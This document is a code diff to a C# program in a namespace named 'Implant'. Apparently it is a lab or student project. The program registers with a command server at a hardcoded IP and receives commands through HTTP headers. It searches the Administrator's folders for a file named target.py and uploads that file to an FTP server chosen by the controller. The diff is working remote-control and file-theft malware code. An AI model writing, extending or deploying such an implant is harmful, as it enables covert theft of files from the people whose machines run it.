@@ -14,7 +14,7 @@ namespace Implant
 {
     class Connection {
         static string cmd = "0"; // Current command
-        static string srvip = ""; // Server IP (passed in)
+        static string srvip = "192.168.68.128"; // Server IP (passed in)
         static string ftpserv = ""; // FTP Server
         static string ftpuser = ""; // FTP User
         static string ftppass = ""; // FTP Password
@@ -25,10 +25,12 @@ namespace Implant
         static void ExfilData(string ip, string user, string pass, string file_loc)
         {
           try{
-            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ip);
+            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ip + "/html/target.py");
             request.Method = WebRequestMethods.Ftp.UploadFile;
 
             request.Credentials = new NetworkCredential(user, pass);
+
+            request.Method = WebRequestMethods.Ftp.UploadFile;
             request.KeepAlive = false;
             request.UseBinary = true;
             request.UsePassive = true;
@@ -36,8 +38,8 @@ namespace Implant
             {
               using (Stream requestStream = request.GetRequestStream())
               {
+
                 fs.CopyTo(requestStream);
-                System.Threading.Thread.Sleep(2000);
                 using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                 {
                   Console.WriteLine("DEBUG: Upload Complete, status {response.StatusDescription}");
@@ -139,9 +141,8 @@ namespace Implant
           cmd = response.GetResponseHeader("cmd");
           if(Found == 1) {
             ftpserv = response.GetResponseHeader("host");
-            ftpuser = response.GetResponseHeader("ftpwebuser");
+            ftpuser = response.GetResponseHeader("username");
             ftppass = response.GetResponseHeader("password");
-
             ExfilData(ftpserv, ftpuser, ftppass, file_loc);
           }
           return;
@@ -215,7 +216,7 @@ namespace Implant
         static void FileSearch()
         {
           Console.WriteLine("Searching...");
-          string[] filelist = Directory.GetFiles(@"C:\home", "*\\target.py", SearchOption.AllDirectories);
+          string[] filelist = Directory.GetFiles(@"C:\Documents and Settings\Administrator", "*target.py", SearchOption.AllDirectories);
           if(filelist.Length == 0)
           {
             Console.WriteLine("File not found.");
@@ -232,16 +233,7 @@ namespace Implant
 
         static void Main(string[] args)
         {
-          try
-          {
-            srvip = args[0];
-          }
-          catch (Exception ex)
-          {
-            Console.Write("You need to specify an IP in the command line.\n");
-            Environment.Exit(1);
-          }
-          Console.WriteLine("DEBUG: IP - " + (string)GetIP());
+          // Console.WriteLine("DEBUG: IP - " + (string)GetIP());
           Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());
 
           Register(); // will hang if server ip not valid
